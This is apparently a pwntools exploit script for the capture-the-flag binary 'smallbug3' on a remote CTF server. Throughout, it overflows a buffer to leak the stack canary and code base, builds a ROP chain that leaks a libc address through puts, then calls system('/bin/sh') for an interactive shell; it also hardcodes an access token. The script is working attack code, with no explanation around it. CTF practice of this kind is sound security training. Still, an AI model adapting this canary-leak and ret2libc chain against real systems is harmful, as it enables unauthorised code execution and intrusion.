from pwn import *
# context.log_level = "debug"
p = process("./smallbug3")
p = remote("ctfgame.acdxvfsvd.net" , 10005)
elf = ELF("./smallbug3")
libc = ELF("./libc-2.23.so")
# libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

p.recvuntil("Token:\n")
p.sendline("zs4cYHvh7gEeFVqAj5UBFTTQvJzTAXrv")
p.sendlineafter("name:\n" , "-1")
p.recvuntil("name:\n")
p.send("a" * 0x89)
p.recvuntil("a" * 0x89)
a = p.recvuntil("Lea")[:-3]
canary = u64(a[:7].rjust(8 , "\x00"))
codebase = u64(a[7:].ljust(8 , "\x00")) - 0xad0

get_addr = lambda x : codebase + x

puts_plt = get_addr(elf.plt["puts"])
puts_got = get_addr(elf.got["puts"])
pop_rdi = get_addr(0xb33)

main = get_addr(0x9CC)

payload = "a" * 0x88 + p64(canary) + "b" * 8 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)
p.send(payload)
p.recvuntil("BYE\n")
puts_addr = u64(p.recvuntil("\n")[:-1].ljust(8 , "\x00"))
libc_base = puts_addr - libc.sym["puts"]
system = libc_base + libc.sym["system"]
str_bin_sh = libc_base + libc.search("/bin/sh").next()
log.info("canary1 : " + hex(canary))
log.info("puts : " + hex(puts_addr))
log.info("libc_base : " + hex(libc_base))

p.sendlineafter("name:\n" , "-1")
p.sendlineafter("name:\n" , "fantasy")

p.recvuntil("us:\n")
payload = "a" * 0x88 + p64(canary) + "b" * 8 + p64(pop_rdi) + p64(str_bin_sh) + p64(system)
p.send(payload)
p.recvuntil("BYE\n")
p.interactive()
